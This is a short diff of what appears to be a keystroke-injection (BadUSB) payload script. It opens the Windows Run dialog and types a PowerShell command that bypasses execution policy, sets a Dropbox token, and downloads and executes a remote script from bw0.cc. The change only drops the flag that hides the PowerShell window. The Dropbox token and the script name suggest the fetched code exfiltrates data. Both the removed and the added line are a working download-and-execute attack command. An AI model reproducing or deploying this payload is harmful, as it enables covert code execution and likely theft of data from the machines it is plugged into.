@@ -14,6 +14,6 @@ REM open powershell (remove -W Hidden to show the window)
 DELAY 1000
 GUI r
 DELAY 750
-STRING powershell -Ep Bypass -W H -C $db='DROPBOX_TOKEN'; iex (irm bw0.cc/exdb)
+STRING powershell -Ep Bypass -C $db='DROPBOX_TOKEN'; iex (irm bw0.cc/exdb)
 ENTER
 
